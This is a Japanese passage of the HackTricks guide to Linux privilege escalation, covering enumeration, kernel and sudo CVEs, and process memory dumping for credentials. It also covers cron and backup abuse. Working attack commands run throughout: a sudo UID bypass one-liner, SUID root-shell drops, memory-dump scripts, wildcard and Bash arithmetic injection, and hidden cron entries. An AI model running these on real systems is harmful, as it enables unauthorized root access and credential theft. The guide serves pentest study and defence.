# Linux 権限昇格

{{#include ../../../banners/hacktricks-training.md}}

より幅広い背景情報や従来の列挙ワークフローについては、references に記載されている g0tmi1k、Payatu、SANS、LPE Workshop、Linux-Privilege-Escalation、linux-private-i の資料を参照してください。<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## システム情報

### OS 情報

まず、実行中の OS について情報を集めましょう。

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### パス

`PATH` 変数内のいずれかのフォルダーに書き込み権限がある場合、一部のライブラリやバイナリを乗っ取れる可能性があります:

```bash
echo $PATH
```

### 環境情報

環境変数に興味深い情報、パスワード、APIキーはありますか？

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

カーネルのバージョンを確認し、権限昇格に使えるexploitがあるか調べます。

[Kernel/LPE/CVE section](../../main-system-information/kernel-lpe-cves/README.md)には、ローカル権限昇格の事例と、Binary ExploitationにあるLinuxカーネルの詳しい解説へのリンクがまとめられています。事例を試す前に、対象のビルドと設定を確認してください。

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

脆弱なkernelの一覧と、すでに**コンパイル済みのexploit**はここで確認できます: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) と [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)。<sup>[[12]](#references)</sup>\
**コンパイル済みのexploit**を確認できるその他のサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbw/linux-exploit-binaries)、[https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

このサイトから脆弱なkernelのバージョンをすべて抽出するには、次のようにします:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

kernel exploit の検索に役立つツール:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (被害者マシン上で実行。kernel 2.x の exploit のみをチェック)

**kernel のバージョンを必ず Google で検索してください**。kernel のバージョンが kernel exploit に記載されている場合があり、その exploit が有効だと確認できます。

その他の kernel exploitation techniques:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux の権限昇格 - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Sudoのバージョン

以下に記載されている脆弱なsudoのバージョンに基づくと：

```bash
searchsploit sudo
```

この grep を使って、sudo のバージョンに脆弱性があるか確認できます。

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Upstream sudo **1.9.14 through 1.9.17** では、sudo がユーザー制御下のディレクトリから `/etc/nsswitch.conf` を読み込む際に、非特権のローカルユーザーが `--chroot` オプションを使って root に権限昇格できます。upstream は **1.9.17p1** で修正しました。`sudo -V` が報告するのは `PATH` で選択されたバイナリのみのため、該当するパスにある root-setuid の sudo 実行ファイルをすべて確認してください。ディストリビューションのパッケージでは upstream のバージョン文字列を変更せずに修正がバックポートされている場合があるため、ベンダーのパッケージ状況も確認してください。[sudo maintainer の advisory](https://www.openwall.com/lists/oss-security/2025/06/30/3) を参照してください。<sup>[[28]](#references)[[29]](#references)</sup>

この [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) を悪用する [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) はこちらです。exploit を実行する前に、使用している `sudo` のバージョンに脆弱性があり、`chroot` 機能をサポートしていることを確認してください。

詳しくは、元の [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) を参照してください。<sup>[[28]](#references)</sup>

### Sudo のホストベースルールのバイパス (CVE-2025-32462)

Upstream sudo **1.8.8 through 1.9.17** では、ホストベースの sudoers ルールを評価する際、**実際のホスト名**ではなく `sudo -h <host>` で**ユーザーが指定したホスト名**を使うことがあります。upstream は **1.9.17p1** で修正しました。ただし、ユーザーは選択したホスト上で一致する sudoers エントリを持っている必要があります。ローカルのポリシーに加え、ベンダーのバックポートや別の sudo バイナリも確認してください。[sudo maintainer の advisory](https://www.openwall.com/lists/oss-security/2025/06/30/2) を参照してください。<sup>[[29]](#references)</sup>

要件:
- 脆弱な sudo バージョン
- ホスト固有の sudoers ルール (ホストが現在のホスト名でも `ALL` でもないこと)

sudoers の設定例:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

許可されたホストを spoofing して Exploit する:

```bash
sudo -h devbox id
sudo -h devbox -i
```

選択した名前の解決が問題になる場合は、その名前がホスト上でどのように解決されるかを確認してください。ログや設定ファイルに名前が記載されているだけでは、その名前が解決可能とは限りません。また、`/etc/hosts` の変更には通常、特権による書き込みアクセスが必要です。

#### sudo < v1.8.28

この[上流のRunas UID bypass](https://ubuntu.com/security/CVE-2019-14287)を悪用するには、rootを除くすべてのユーザーとしてコマンドを実行できる有効なsudoルールが必要です。たとえば、`(ALL, !root) /bin/bash` のようなルールです。呼び出し元ユーザーが、そのルールを使用できることも必要です。認証が必要な場合は、その要件も満たさなければなりません。インストール済みパッケージのセキュリティ勧告を確認してください。ベンダーが修正をバックポートしている場合、表示上の上流バージョンが1.8.28未満でも修正済みのことがあります。`!root` ルールや古いバージョンだけでは、脆弱性があるとは判断できません。受動的な列挙中に、特権コマンドを実行してテストしないでください。

```
sudo -u#-1 /bin/bash
```

### Dmesgの署名検証に失敗

この脆弱性を悪用する方法の**例**については、HTBの**smasher2 box**を確認してください。

```bash
dmesg 2>/dev/null | grep "signature"
```

### システム情報の追加調査

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## 可能な防御策を列挙する

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

コンテナ内にいる場合は、まず以下のコンテナセキュリティのセクションを確認し、その後、ランタイム固有の悪用ページに進んでください。


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## ドライブ

**マウントされているもの、マウント解除されているもの**、その場所と理由を確認してください。マウント解除されているものがあれば、マウントして個人情報がないか確認してみましょう。

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## 有用なソフトウェア

便利なバイナリを列挙する

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

また、**コンパイラがインストールされているか**確認してください。kernel exploit を使用する必要がある場合に役立ちます。使用するマシン上（または類似した環境）でコンパイルすることが推奨されるためです。

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### インストールされている脆弱なソフトウェア

**インストール済みパッケージやサービスのバージョン**を確認しましょう。たとえば、古いバージョンの Nagios があり、権限昇格に悪用できるかもしれません…\
疑わしいソフトウェアについては、バージョンを手動で確認することをおすすめします。

```bash
dpkg -l #Debian
rpm -qa #Centos
```

SSHでマシンにアクセスできる場合は、**openVAS**を使って、マシン内にインストールされている古く脆弱なソフトウェアを確認することもできます。

> [!NOTE] > _これらのコマンドでは、ほとんど役に立たない大量の情報が表示されます。そのため、インストールされているソフトウェアのバージョンに既知のexploitに対する脆弱性がないか確認するOpenVASなどのアプリケーションを使うことをおすすめします。_

## プロセス

実行中の**プロセス**を確認し、必要以上の**権限**を持つプロセスがないかチェックしてください（たとえば、rootで実行されているtomcatなど）。

```bash
ps aux
ps -ef
top -n 1
```

常に、実行中の[**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md)がないか確認してください。権限昇格に悪用できる可能性があります。**Linpeas**は、プロセスのコマンドライン内にある`--inspect`パラメーターを確認して、これらを検出します。\
また、**プロセスのバイナリに対する自分の権限も確認してください**。誰かのバイナリを上書きできるかもしれません。

### ユーザーをまたぐ親子プロセスの連鎖

**異なるユーザー**で実行されている子プロセスが、親プロセスと異なるユーザーであることは、それだけで悪意があるとは限りませんが、有用な**トリアージシグナル**です。一部のユーザー切り替えは想定される動作です（`root`がサービスユーザーを起動する、ログインマネージャーがセッションプロセスを作成するなど）。一方、通常とは異なる連鎖から、ラッパー、デバッグヘルパー、永続化、または脆弱なランタイムの信頼境界が見つかることがあります。

簡単な確認:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

意外な chain を見つけた場合は、親プロセスのコマンドラインと、その動作に影響するすべてのファイル（`config`、`EnvironmentFile`、helper scripts、working directory、書き込み可能な引数）を調べてください。実際の privesc では、子プロセス自体は書き込み不可でも、**親が制御する config** や helper chain が書き込み可能なケースがいくつもありました。

### 削除された実行ファイルと、削除済みファイルを開いているプロセス

実行時の成果物は、**削除後も**アクセスできることがよくあります。これは privilege escalation にも、機密ファイルをすでに開いているプロセスから証拠を回収する場合にも役立ちます。

削除された実行ファイルを確認します。

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

`/proc/<PID>/exe` が `(deleted)` を指している場合、そのプロセスはメモリ上の古いバイナリイメージを引き続き実行しています。これは調査すべき強い兆候です。理由は次のとおりです。

- 削除された実行ファイルに興味深い文字列や認証情報が含まれている可能性がある
- 実行中のプロセスが有用なファイルディスクリプターを引き続き公開している可能性がある
- 削除された特権バイナリは、最近の改ざんや痕跡隠蔽の試みを示している可能性がある

削除済みで開かれているファイルを全体から収集します：

```bash
lsof +L1
```

興味深いディスクリプタを見つけたら、直接復元してください。

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

これは、プロセスが削除済みの秘密情報、スクリプト、データベースのエクスポート、またはフラグファイルを開いたままの場合に、特に有用です。

### プロセスの監視

[**pspy**](https://github.com/DominicBreuker/pspy) のようなツールを使ってプロセスを監視できます。頻繁に実行される脆弱なプロセスや、特定の条件が満たされたときに実行されるプロセスを特定するのに非常に役立ちます。

#### sudo での Linux ProcMon

[Linux 用 ProcMon](https://github.com/microsoft/ProcMon-for-Linux) は、選択したプロセスやシステムコールをトレースし、SQLite トレースを保存できます。`sudo -l` で制限のない、root 権限で実行可能な `procmon` コマンドが許可されている場合、他のユーザーのプロセスの入力や出力を監視できるか検討してください。この権限は調査の手がかりにすぎません。トレーサーのサポート、実効ポリシー、適切なプロセスの稼働状況がすべて影響します。トレースファイルには秘密情報が含まれる場合があるため、許可されたエクスポートを慎重に調査し、無関係なプロセスの収集は避けてください。

### プロセスメモリ

サーバーのサービスによっては、**認証情報をメモリ内に平文で保存します**。\
通常、他のユーザーに属するプロセスのメモリを読み取るには**root 権限**が必要です。そのため、これは通常、すでに root 権限を持っていて、さらに認証情報を探したい場合に役立ちます。\
ただし、**一般ユーザーでも、自分が所有するプロセスのメモリは読み取れる**ことを覚えておいてください。

> [!WARNING]
> 現在、ほとんどのマシンではデフォルトで **ptrace が許可されていない**ため、権限のないユーザーとして他のプロセスをダンプできません。
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ ファイルは、ptrace のアクセス可否を制御します。
>
> - **kernel.yama.ptrace_scope = 0**: 同じ uid を持つプロセスであれば、すべてデバッグできます。これが ptrace の従来の動作です。
> - **kernel.yama.ptrace_scope = 1**: 親プロセスのみデバッグできます。
> - **kernel.yama.ptrace_scope = 2**: CAP_SYS_PTRACE ケーパビリティが必要なため、管理者のみ ptrace を使用できます。
> - **kernel.yama.ptrace_scope = 3**: ptrace でトレースできるプロセスはありません。一度設定すると、ptrace を再び有効にするには再起動が必要です。

一時的にパスワード保管庫のロックを解除する同一 UID のプロセスは、別個の認証情報境界となる場合があります。トレースが許可されている場合、実行中でダンプ可能なプロセスから、入力システムコールやメモリを通じて保管庫のパスワードが露出する可能性があります。暗号化された保管庫ファイル自体は保護されたままでも同様です。`ptrace_scope=0` は前提条件の一つにすぎません。同一の認証情報、対象プロセスのダンプ可能性、その他の Linux セキュリティモジュール、プロセスの存続時間も影響します。保管庫のエントリを Unix の root ログインに使えるかどうかは、別途、認証情報の再利用を確認する必要があります。通常の列挙では、入力を取得したり秘密情報を表示したりせず、ポリシーと候補となるプロセスまたは保管庫のパスを報告してください。[kernel の Yama ドキュメント](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) と [ptrace のアクセスチェック](https://man7.org/linux/man-pages/man2/ptrace.2.html)を参照してください。

#### GDB

（たとえば）FTP サービスのメモリにアクセスできる場合、その Heap を取得し、認証情報を検索できます。

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB スクリプト

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

指定したプロセス ID の場合、**maps はそのプロセスの仮想アドレス空間内でメモリがどのようにマッピングされているか**を示し、**各マッピング領域の権限**も表示します。**mem** 擬似ファイルは、**プロセスのメモリそのものを公開**します。**maps** ファイルから、**読み取り可能なメモリ領域**とそのオフセットがわかります。この情報を使って、**mem ファイル内の該当位置にシークし、読み取り可能な領域をすべてファイルにダンプ**します。

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` はシステムの**物理**メモリにアクセスできます。仮想メモリにはアクセスできません。カーネルの仮想アドレス空間には /dev/kmem を使ってアクセスできます。\
通常、`/dev/mem` の読み取りは **root** と **kmem** グループにのみ許可されています。

```
strings /dev/mem -n10 | grep -i PASS
```

### Linux 向け ProcDump

ProcDump は、Windows 用 Sysinternals ツールスイートに含まれる従来の ProcDump ツールを Linux 向けに再構築したものです。[https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) から入手できます。

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### ツール

プロセスのメモリをダンプするには、次を使用できます。

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root の要件は手動で削除でき、自分が所有するプロセスをダンプできます
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) のスクリプト A.5 (root が必要)

### プロセスメモリからの認証情報

#### 手動での例

authenticator プロセスが実行中であることがわかった場合:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

プロセスをdumpして（プロセスのメモリをdumpするさまざまな方法については前のセクションを参照）、メモリ内の認証情報を検索できます。

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

ツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、メモリや一部の**よく知られたファイル**から**平文の認証情報を盗み出します**。正常に動作させるには root 権限が必要です。

| 機能                                           | プロセス名         |
| ------------------------------------------------- | -------------------- |
| GDM パスワード（Kali デスクトップ、Debian デスクトップ）       | gdm-password         |
| Gnome Keyring（Ubuntu デスクトップ、ArchLinux デスクトップ） | gnome-keyring-daemon |
| LightDM（Ubuntu デスクトップ）                          | lightdm              |
| VSFTPd（アクティブな FTP 接続）                   | vsftpd               |
| Apache2（アクティブな HTTP Basic Auth セッション）         | apache2              |
| OpenSSH（アクティブな SSH セッション - Sudo の使用）        | sshd:                |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## スケジュール/Cron ジョブ

### root として実行される Crontab UI (alseambusher) – Web ベースの scheduler privesc

Web の「Crontab UI」パネル (alseambusher/crontab-ui) が root として実行され、loopback のみにバインドされている場合でも、SSH のローカルポートフォワーディング経由でアクセスし、特権ジョブを作成して権限昇格できます。<sup>[[1]](#references)[[4]](#references)</sup>

典型的な手順
- loopback のみにバインドされたポート（例: 127.0.0.1:8000）と Basic-Auth realm を `ss -ntlp` / `curl -v localhost:8000` で特定する
- 運用上のファイルから認証情報を探す:
  - `zip -P <password>` を含むバックアップ/スクリプト
  - `Environment="BASIC_AUTH_USER=..."`、`Environment="BASIC_AUTH_PWD=..."` を公開している systemd unit
- トンネルを作成してログインする:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 高権限ジョブを作成して即座に実行（SUID shellをdrop）:
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用する:
```bash
/tmp/rootshell -p   # root shell
```

ハードニング
- Crontab UI を root として実行せず、専用ユーザーと最小限の権限で制限する
- localhost にバインドし、さらに firewall/VPN でアクセスを制限する。パスワードを使い回さない
- unit files に secrets を埋め込まない。secret stores または root のみが読み取り可能な EnvironmentFile を使用する
- オンデマンドのジョブ実行に対する audit/logging を有効にする

スケジュールされたジョブに脆弱性がないか確認してください。root が実行するスクリプトを悪用できるかもしれません（wildcard vuln？ root が使うファイルを変更できる？ symlinks を使う？ root が使うディレクトリに特定のファイルを作成する？）。

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

`run-parts` が使用されている場合、実際に実行される名前を確認する：

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

これは false positive を避けるためです。書き込み可能な定期実行ディレクトリが役立つのは、ペイロードのファイル名がローカルの `run-parts` のルールに一致する場合だけです。

### Cron path

たとえば、_/etc/crontab_ 内に PATH が記載されています: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ユーザー「user」が /home/user に対する書き込み権限を持っていることに注意してください_)

この crontab 内で、root ユーザーが PATH を設定せずにコマンドやスクリプトを実行しようとした場合を考えてみましょう。例: _\* \* \* \* root overwrite.sh_\
その場合、次の方法で root shell を取得できます:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron using a script with a wildcard (Wildcard Injection)

root がスクリプトを実行し、そのコマンド内に「**\***」が含まれている場合、これを悪用して予期しないこと（privesc など）を引き起こせる可能性があります。例:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**wildcard の前に** _**/some/path/\***_ **のようなパスがある場合、脆弱ではありません（** _**./\***_ **でも同様です）。**

wildcard exploitation のその他のテクニックについては、以下のページを参照してください。


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### cron log parser における Bash arithmetic expansion injection

Bash arithmetic は、信頼できないテキストを式として解釈することがあります。影響を受ける Bash のコンテキストでは、その式内の array subscript によって command substitution が評価されることがあります。特権で実行される cron/parser が、攻撃者によって制御されたログのテキストをそのような算術比較に渡すと、parser の権限で substitution が実行される可能性があります。<sup>[[22]](#references)</sup> これは正確な Bash の式とバージョンに依存します。展開された変数内の単なる `$(...)0` 文字列だけでは、再評価が起きることを確実に示せません。

入力は、ファイルのメタデータや、ユーザーが書き込み可能な場所から読み取られる別のフィールドに由来することもあります。たとえば、特権で実行される cleanup script が画像の `Producer` タグを読み取り、`[[ "$producer" -eq "expected" ]]` と比較する場合、変数が引用符で囲まれていても算術比較が行われます。スケジュールされた処理の実行ユーザー、タグの供給元となり得るファイル、比較前の変換処理、正確な Bash の動作を調べてください。テキストラベルには文字列比較を使い、数値には算術処理の前に入力が10進数字のみであることを検証してください。[Bash arithmetic のルール](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html)を参照してください。

- 典型的な脆弱パターン:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- array-subscript mechanism の安全なローカル動作プローブ（特権プロセスやファイルの変更なし）:
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

実際にスケジュール実行されるスクリプトと、それが開くリテラルな入力パスを追跡してください。ログファイル自体に書き込めなくても、sticky bit のない親ディレクトリに書き込みとアクセスができるユーザーは、そのディレクトリエントリを置き換えられる場合があります。`namei -l` を使うと、これらの権限を区別できます。別の書き込み可能なログパス、読み取れないスケジューラ、またはそのフィールドを Bash の算術式として評価しないパーサーでは、この経路が成立することの証明にはなりません。

### Cron スクリプトの上書きと symlink

root で実行される **cron スクリプトを変更できる**場合、簡単に shell を取得できます：

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

rootが実行するスクリプトで、**完全にアクセスできるディレクトリ**が使われている場合、そのフォルダーを削除し、**別の場所へのsymlinkを作成して**自分が制御するスクリプトを配置すると有効かもしれません。

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Symlink の検証とより安全なファイル処理

パスを指定してファイルを読み書きする特権スクリプトやバイナリを確認する際は、リンクの扱い方を検証します。

- `stat()` は symlink をたどり、リンク先のメタデータを返します。
- `lstat()` はリンク自体のメタデータを返します。
- `readlink -f` と `namei -l` は、最終的なリンク先の解決や、各パス要素の権限の確認に役立ちます。

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

防御担当者や開発者がシンボリックリンクを使った攻撃へのリスクを下げるには、次のような安全なパターンを使用します。

- `O_EXCL` と `O_CREAT`：パスがすでに存在する場合は失敗する（攻撃者が事前に作成したリンクやファイルをブロック）。
- `openat()`：信頼できるディレクトリのファイルディスクリプタを基準に操作する。
- `mkstemp()`：安全なパーミッションで一時ファイルをアトミックに作成する。

### 書き込み可能なペイロードを含むカスタム署名済みcronバイナリ

rootのcronジョブが実行するバイナリそのものに通常ユーザーが書き込める場合、権限境界を越えられる可能性があります。ただし、カスタム署名チェックによって、署名のない差し替えを拒否できる場合があります。記録された事例では、root所有のELFはモード `0760` で、グループのメンバーは書き込み可能、root所有者は実行可能でした。目に見えるプロセストレースから、ジョブがバイナリを実行する前に `objcopy` が `.text_sig` を抽出していたことが分かりましたが、検証スクリプト全体は読み取りできませんでした。<sup>[[2]](#references)</sup>

成功した差し替えは、leaked private signing materialを使ってELF signerで署名されていました。その[フォーマットのドキュメント](https://github.com/NUAA-WatchDog/linux-elf-binary-signer)によると、署名セクションは実行ファイルの `.text` から生成されます。証明書や一致する文字列を `.text_sig` に追加するだけで、内容が確認できない検証処理を通過するとは示されていません。書き込み可能な署名済みバイナリが悪用可能だと結論づける前に、実際の実行対象パス、実効的な書き込み権限、rootによる実行、および検証ポリシーを確認してください。`.text_sig` セクションの存在だけでは、調査の手がかりにすぎません。

### 頻繁に実行されるcronジョブ

1分、2分、5分ごとに実行されるプロセスを探すには、プロセスを監視できます。そこを利用して権限昇格できるかもしれません。

たとえば、**1分間、0.1秒ごとに監視し**、**実行回数の少ないコマンド順に並べ**、最も多く実行されたコマンドを削除するには、次のようにします。

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**次も使用できます** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（起動するすべてのプロセスを監視して一覧表示します）。

### 攻撃者が設定した mode bits を保持する root バックアップ（pg_basebackup）

root 所有の cron が、書き込み可能なデータベースディレクトリに対して `pg_basebackup`（または再帰的なコピー）を実行する場合、**SUID/SGID binary** を配置できます。すると、そのファイルは同じ mode bits を保ったまま、バックアップ先に **root:root** として再コピーされます。<sup>[[26]](#references)</sup>

一般的な調査手順（低権限の DB user として）:
- `pspy` を使って、たとえば `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` のようなコマンドを root cron が毎分実行していることを確認します。
- ソースクラスター（例: `/var/lib/postgresql/14/main`）に自分が書き込み可能であることと、ジョブの実行後に宛先（`/opt/backups/current`）が root 所有になることを確認します。

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

これは、`pg_basebackup` がクラスタのコピー時にファイルモードビットを保持するためです。root が実行すると、コピー先のファイルは **root 所有権 + 攻撃者が指定した SUID/SGID** を引き継ぎます。権限を保持したまま実行可能な場所に書き込む、同様の特権バックアップ／コピー処理は、いずれも脆弱です。

### 見えない cron ジョブ

コメントの後に改行文字を入れずに **キャリッジリターンを置く**ことで、cronjob を作成できます。この cron job は正常に動作します。例（キャリッジリターン文字に注意）：

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

この種の隠密なエントリを検出するには、制御文字を表示できるツールでcronファイルを調べます。

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## サービス

### 書き込み可能な _.service_ ファイル

任意の `.service` ファイルに書き込めるか確認してください。書き込める場合、サービスの**起動時**、**再起動時**、または**停止時**に**バックドアを実行する**よう変更できます（マシンが再起動されるまで待つ必要があるかもしれません）。\
